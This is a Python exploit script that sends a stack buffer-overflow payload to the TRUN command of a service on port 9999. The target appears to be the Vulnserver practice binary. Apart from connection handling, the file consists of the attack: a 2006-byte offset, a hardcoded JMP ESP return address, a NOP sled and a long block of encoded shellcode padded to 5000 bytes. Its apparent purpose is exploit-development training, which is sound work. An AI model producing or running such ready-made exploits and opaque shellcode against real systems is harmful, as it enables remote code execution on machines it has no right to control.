import socket

def connect_to_server(host='127.0.0.1', port=9999):
    try:
        # Create a socket object
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        
        # Connect to the server
        client_socket.connect((host, port))
        print(f"Successfully connected to {host} on port {port}")

        # Example of sending a message (5000 'A's, which is 0x41 in ASCII)
        header = b"TRUN ."
        filler_offset = b"A" * 2006 # Offset
        ret_address = b"\xaf\x11\x50\x62" #  JMP ESP address `0x625011af`
        nop_sled = b"\x90" * 10 #NOP opcode is 90
        shellcode = (
                b"\xba\xef\xca\x0a\x97\xdb\xca\xd9\x74\x24\xf4\x5e\x31\xc9"
                b"\xb1\x52\x83\xc6\x04\x31\x56\x0e\x03\xb9\xc4\xe8\x62\xb9"
                b"\x31\x6e\x8c\x41\xc2\x0f\x04\xa4\xf3\x0f\x72\xad\xa4\xbf"
                b"\xf0\xe3\x48\x4b\x54\x17\xda\x39\x71\x18\x6b\xf7\xa7\x17"
                b"\x6c\xa4\x94\x36\xee\xb7\xc8\x98\xcf\x77\x1d\xd9\x08\x65"
                b"\xec\x8b\xc1\xe1\x43\x3b\x65\xbf\x5f\xb0\x35\x51\xd8\x25"
                b"\x8d\x50\xc9\xf8\x85\x0a\xc9\xfb\x4a\x27\x40\xe3\x8f\x02"
                b"\x1a\x98\x64\xf8\x9d\x48\xb5\x01\x31\xb5\x79\xf0\x4b\xf2"
                b"\xbe\xeb\x39\x0a\xbd\x96\x39\xc9\xbf\x4c\xcf\xc9\x18\x06"
                b"\x77\x35\x98\xcb\xee\xbe\x96\xa0\x65\x98\xba\x37\xa9\x93"
                b"\xc7\xbc\x4c\x73\x4e\x86\x6a\x57\x0a\x5c\x12\xce\xf6\x33"
                b"\x2b\x10\x59\xeb\x89\x5b\x74\xf8\xa3\x06\x11\xcd\x89\xb8"
                b"\xe1\x59\x99\xcb\xd3\xc6\x31\x43\x58\x8e\x9f\x94\x9f\xa5"
                b"\x58\x0a\x5e\x46\x99\x03\xa5\x12\xc9\x3b\x0c\x1b\x82\xbb"
                b"\xb1\xce\x05\xeb\x1d\xa1\xe5\x5b\xde\x11\x8e\xb1\xd1\x4e"
                b"\xae\xba\x3b\xe7\x45\x41\xac\x77\x9a\x49\x2d\xe0\x98\x49"
                b"\x2c\x4b\x15\xaf\x44\xbb\x70\x78\xf1\x22\xd9\xf2\x60\xaa"
                b"\xf7\x7f\xa2\x20\xf4\x80\x6d\xc1\x71\x92\x1a\x21\xcc\xc8"
                b"\x8d\x3e\xfa\x64\x51\xac\x61\x74\x1c\xcd\x3d\x23\x49\x23"
                b"\x34\xa1\x67\x1a\xee\xd7\x75\xfa\xc9\x53\xa2\x3f\xd7\x5a"
                b"\x27\x7b\xf3\x4c\xf1\x84\xbf\x38\xad\xd2\x69\x96\x0b\x8d"
                b"\xdb\x40\xc2\x62\xb2\x04\x93\x48\x05\x52\x9c\x84\xf3\xba"
                b"\x2d\x71\x42\xc5\x82\x15\x42\xbe\xfe\x85\xad\x15\xbb\xb6"
                b"\xe7\x37\xea\x5e\xae\xa2\xae\x02\x51\x19\xec\x3a\xd2\xab"
                b"\x8d\xb8\xca\xde\x88\x85\x4c\x33\xe1\x96\x38\x33\x56\x96"
                b"\x68")
        shellcode += b"C" * ( 5000 - len(header) - len(filler_offset) - len(ret_address) - len(shellcode) )
        exploit = header + filler_offset  + ret_address + nop_sled + shellcode 

        client_socket.sendall(exploit)  # No need to encode since it's already in byte format

        print(f"Sent message")  

        # Example of receiving a response (if any)
        response = client_socket.recv(1024)
        if response:
            print(f"Received response: {response.decode('utf-8')}")
        else:
            print("No response received from the server.")

    except socket.error as e:
        print(f"Socket error: {e}")
    
    finally:
        # Close the connection
        client_socket.close()
        print("Connection closed.")

if __name__ == "__main__":
    connect_to_server()
